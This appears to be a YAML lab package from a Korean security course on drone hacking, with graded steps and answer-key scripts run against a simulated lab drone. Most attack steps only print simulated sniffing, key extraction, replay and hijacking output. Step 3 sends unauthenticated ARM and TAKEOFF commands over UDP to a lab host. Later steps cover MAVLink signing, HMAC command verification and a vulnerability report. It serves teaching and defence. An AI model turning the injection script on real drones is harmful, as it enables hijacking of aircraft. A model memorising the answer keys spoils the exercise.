lab_id: autonomous-systems-ai-week03
title: '[Non-AI] 드론 해킹'
version: ai
course: autonomous-systems-ai
week: 3
description: 드론 통신 스니핑, 명령 인젝션, 하이재킹 기법을 실습합니다
difficulty: medium
duration_minutes: 120
objectives:
- 드론 통신을 스니핑한다
- 명령 인젝션 공격을 수행한다
- 드론 하이재킹 시나리오를 시뮬레이션한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Python으로 가상 드론 통신 패킷을 스니핑하는 시뮬레이터를 작성하시오. 6개 이상의 캡처된 패킷을 출력하라.
  hint: 캡처된 패킷 리스트를 만들고 분석하세요.
  category: recon
  points: 10
  answer: python3 -c "import json;pkts=[{'src':'10.20.30.201','data':{'action':'AUTH','key':'DRONE_SECRET'}},{'src':'10.20.30.201','data':{'action':'ARM'}},{'src':'10.20.30.201','data':{'action':'TAKEOFF','alt':50}},{'src':'10.20.30.200','data':{'status':'FLYING'}},{'src':'10.20.30.201','data':{'action':'GOTO','lat':37.57}},{'src':'10.20.30.201','data':{'action':'LAND'}}];print('===
    Sniffed Packets ===');[print(f'  [{i}] {p[\"src\"]} -> {json.dumps(p[\"data\"])}') for i,p in enumerate(pkts)]"
  answer_detail: 통신 스니핑으로 인증키와 명령 구조를 파악합니다.
  verify:
    type: output_contains
    expect: Sniffed Packets
    field: stdout
  target_vm: attacker
  script: python3 -c "import json;pkts=[{'src':'10.20.30.201','data':{'action':'AUTH','key':'DRONE_SECRET'}},{'src':'10.20.30.201','data':{'action':'ARM'}},{'src':'10.20.30.201','data':{'action':'TAKEOFF','alt':50}},{'src':'10.20.30.200','data':{'status':'FLYING'}},{'src':'10.20.30.201','data':{'action':'GOTO','lat':37.57}},{'src':'10.20.30.201','data':{'action':'LAND'}}];print('===
    Sniffed Packets ===');[print(f'  [{i}] {p[\"src\"]} -> {json.dumps(p[\"data\"])}') for i,p in enumerate(pkts)]"
  risk_level: low
- order: 2
  instruction: 스니핑된 패킷에서 평문 인증키를 추출하시오. 키가 평문으로 전송되는 위험성을 출력하라.
  hint: 캡처된 패킷 중 AUTH 액션을 가진 패킷에서 key 필드를 찾으세요.
  category: attack
  points: 12
  answer: 'python3 -c "pkts=[{''action'':''AUTH'',''key'':''DRONE_SECRET_2026''},{''action'':''ARM''},{''action'':''TAKEOFF''}];found=[p[''key''] for p in pkts if ''key'' in p];print(f''[CRITICAL] Auth
    key found in plaintext: {found[0]}'') if found else print(''No key found'')"'
  answer_detail: 평문 인증키 전송은 가장 심각한 드론 통신 취약점입니다.
  verify:
    type: output_contains
    expect: CRITICAL
    field: stdout
  target_vm: attacker
  script: 'python3 -c "pkts=[{''action'':''AUTH'',''key'':''DRONE_SECRET_2026''},{''action'':''ARM''},{''action'':''TAKEOFF''}];found=[p[''key''] for p in pkts if ''key'' in p];print(f''[CRITICAL] Auth
    key found in plaintext: {found[0]}'') if found else print(''No key found'')"'
  risk_level: low
- order: 3
  instruction: Python으로 인증 없이 가상 드론에 ARM/TAKEOFF 명령을 인젝션하는 스크립트를 작성하시오.
  hint: UDP 소켓으로 직접 명령 JSON을 전송하세요.
  category: attack
  points: 12
  answer: 'python3 -c "import socket,json;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(2);cmds=[{''action'':''ARM''},{''action'':''TAKEOFF'',''altitude'':100}];print(''=== Command Injection
    ==='');[print(f''  Injecting: {json.dumps(c)}'') for c in cmds];[s.sendto(json.dumps(c).encode(),(''10.20.30.200'',9999)) for c in cmds];print(''  [!] Commands sent without authentication'');s.close()"'
  answer_detail: 인증 없는 명령 전송은 드론 탈취의 핵심 공격 벡터입니다.
  verify:
    type: output_contains
    expect: Command Injection
    field: stdout
  target_vm: attacker
  script: 'python3 -c "import socket,json;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(2);cmds=[{''action'':''ARM''},{''action'':''TAKEOFF'',''altitude'':100}];print(''=== Command Injection
    ==='');[print(f''  Injecting: {json.dumps(c)}'') for c in cmds];[s.sendto(json.dumps(c).encode(),(''10.20.30.200'',9999)) for c in cmds];print(''  [!] Commands sent without authentication'');s.close()"'
  risk_level: low
- order: 4
  instruction: MAVLink 리플레이 공격을 시뮬레이션하시오. 캡처된 TAKEOFF 명령을 재전송하는 코드를 작성하라.
  hint: 이전에 캡처한 명령을 동일하게 재전송하세요.
  category: attack
  points: 12
  answer: 'python3 -c "import json;captured={''action'':''TAKEOFF'',''altitude'':50};print(''=== Replay Attack ==='');print(f''  Captured: {json.dumps(captured)}'');print(f''  Replaying captured TAKEOFF
    command...'');print(f''  [!] No sequence number validation = replay possible'')"'
  answer_detail: 리플레이 공격은 시퀀스 번호 미검증 시 가능합니다.
  verify:
    type: output_contains
    expect: Replay Attack
    field: stdout
  target_vm: attacker
  script: 'python3 -c "import json;captured={''action'':''TAKEOFF'',''altitude'':50};print(''=== Replay Attack ==='');print(f''  Captured: {json.dumps(captured)}'');print(f''  Replaying captured TAKEOFF
    command...'');print(f''  [!] No sequence number validation = replay possible'')"'
  risk_level: low
- order: 5
  instruction: 드론 하이재킹 시나리오 전체를 시뮬레이션하시오. 정찰→Deauth→연결→인증→제어의 5단계를 출력하라.
  hint: 각 단계를 순서대로 출력하는 스크립트를 작성하세요.
  category: attack
  points: 12
  answer: 'python3 -c "steps=[(''RECON'',''Drone found at 10.20.30.200:9999''),(''DEAUTH'',''Legitimate controller disconnected''),(''CONNECT'',''Connected to drone WiFi AP''),(''AUTH'',''Authenticated
    with sniffed key''),(''CONTROL'',''ARM+TAKEOFF+GOTO executed'')];print(''=== Hijacking Simulation ==='');[print(f''  Phase {i+1} [{s[0]}]: {s[1]}'') for i,s in enumerate(steps)];print(''  [!] Drone
    fully compromised'')"'
  answer_detail: 전체 하이재킹 시나리오를 이해하면 방어 지점을 파악할 수 있습니다.
  verify:
    type: output_contains
    expect: Hijacking Simulation
    field: stdout
  target_vm: attacker
  script: 'python3 -c "steps=[(''RECON'',''Drone found at 10.20.30.200:9999''),(''DEAUTH'',''Legitimate controller disconnected''),(''CONNECT'',''Connected to drone WiFi AP''),(''AUTH'',''Authenticated
    with sniffed key''),(''CONTROL'',''ARM+TAKEOFF+GOTO executed'')];print(''=== Hijacking Simulation ==='');[print(f''  Phase {i+1} [{s[0]}]: {s[1]}'') for i,s in enumerate(steps)];print(''  [!] Drone
    fully compromised'')"'
  risk_level: low
- order: 6
  instruction: LLM에게 드론 하이재킹 방어를 위한 MAVLink 서명 구현 방법을 질의하시오.
  hint: MAVLink v2 signing을 질문하세요.
  category: analysis
  points: 10
  answer: curl -s ${LLM_URL:-http://10.20.30.200:11434}/api/chat -d '{"model":"gemma3:4b","messages":[{"role":"system","content":"You are a drone security engineer."},{"role":"user","content":"How does
    MAVLink v2 message signing work? Explain the signing process and how it prevents command injection."}],"stream":false,"options":{"num_predict":150}}' | python3 -c "import sys,json; print(json.load(sys.stdin)['message']['content'])"
  answer_detail: MAVLink v2 서명은 명령 인젝션 방어의 핵심입니다.
  verify:
    type: output_contains
    expect: ''
    field: stdout
  target_vm: manager
  script: curl -s ${LLM_URL:-http://10.20.30.200:11434}/api/chat -d '{"model":"gemma3:4b","messages":[{"role":"system","content":"You are a drone security engineer."},{"role":"user","content":"How does
    MAVLink v2 message signing work? Explain the signing process and how it prevents command injection."}],"stream":false,"options":{"num_predict":150}}' | python3 -c "import sys,json; print(json.load(sys.stdin)['message']['content'])"
  risk_level: low
- order: 7
  instruction: Python으로 HMAC 기반 명령 서명 검증 시스템을 구현하시오. 서명된 명령과 위조된 명령을 구분하라.
  hint: hmac 모듈로 메시지 서명을 생성하고 검증하세요.
  category: config
  points: 12
  answer: 'python3 -c "import hmac,hashlib,json;key=b''drone_secret'';cmd=json.dumps({''action'':''ARM''});sig=hmac.new(key,cmd.encode(),hashlib.sha256).hexdigest()[:16];fake_sig=''0000000000000000'';print(''===
    Command Signing ==='');print(f''  Valid sig: {sig}'');print(f''  Verify valid: {hmac.new(key,cmd.encode(),hashlib.sha256).hexdigest()[:16]==sig}'');print(f''  Verify fake:  {fake_sig==sig}'');print(''  [OK]
    Signing prevents command forgery'')"'
  answer_detail: HMAC 서명으로 명령 무결성을 보장할 수 있습니다.
  verify:
    type: output_contains
    expect: Command Signing
    field: stdout
  target_vm: attacker
  script: 'python3 -c "import hmac,hashlib,json;key=b''drone_secret'';cmd=json.dumps({''action'':''ARM''});sig=hmac.new(key,cmd.encode(),hashlib.sha256).hexdigest()[:16];fake_sig=''0000000000000000'';print(''===
    Command Signing ==='');print(f''  Valid sig: {sig}'');print(f''  Verify valid: {hmac.new(key,cmd.encode(),hashlib.sha256).hexdigest()[:16]==sig}'');print(f''  Verify fake:  {fake_sig==sig}'');print(''  [OK]
    Signing prevents command forgery'')"'
  risk_level: low
- order: 8
  instruction: 드론 통신 보안 취약점 보고서를 Python으로 생성하시오. 발견된 취약점, 심각도, 대응 방안을 포함하라.
  hint: 취약점을 딕셔너리 리스트로 정의하고 보고서 형태로 출력하세요.
  category: analysis
  points: 10
  answer: 'python3 -c "vulns=[(''Plaintext Auth Key'',''CRITICAL'',''Encrypt with TLS''),(''No MAVLink Signing'',''CRITICAL'',''Enable v2 signing''),(''Replay Possible'',''HIGH'',''Add sequence validation''),(''No
    Encryption'',''HIGH'',''Implement DTLS'')];print(''=== Vulnerability Report ==='');[print(f''  [{s}] {v} -> {m}'') for v,s,m in vulns];print(f''  Total: {len(vulns)} findings'')"'
  answer_detail: 취약점 보고서는 보안 개선의 기초 문서입니다.
  verify:
    type: output_contains
    expect: Vulnerability Report
    field: stdout
  target_vm: attacker
  script: 'python3 -c "vulns=[(''Plaintext Auth Key'',''CRITICAL'',''Encrypt with TLS''),(''No MAVLink Signing'',''CRITICAL'',''Enable v2 signing''),(''Replay Possible'',''HIGH'',''Add sequence validation''),(''No
    Encryption'',''HIGH'',''Implement DTLS'')];print(''=== Vulnerability Report ==='');[print(f''  [{s}] {v} -> {m}'') for v,s,m in vulns];print(f''  Total: {len(vulns)} findings'')"'
  risk_level: low
